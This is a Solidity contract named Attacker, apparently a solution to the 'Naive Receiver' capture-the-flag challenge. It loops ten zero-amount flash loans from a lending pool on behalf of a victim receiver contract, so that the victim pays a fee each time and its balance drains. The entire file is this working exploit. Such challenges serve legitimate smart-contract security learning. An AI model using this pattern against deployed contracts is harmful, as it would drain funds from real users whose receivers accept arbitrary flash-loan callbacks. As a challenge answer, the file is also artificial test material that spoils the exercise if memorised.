// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";
/**
 * @title Attacker
 * @author kyrers
 * @notice This contract just performs the attack for us. Instead of us sending 10 transactions to the pool, we can just send one to this contract
 */

contract Attacker {

    NaiveReceiverLenderPool private pool;
    FlashLoanReceiver private victim;

    constructor(address payable _pool, address payable _victim) {
        pool = NaiveReceiverLenderPool(_pool);
        victim = FlashLoanReceiver(_victim);
    }

    function attack() public {
        for(uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(victim), 0);
        }
    }
}
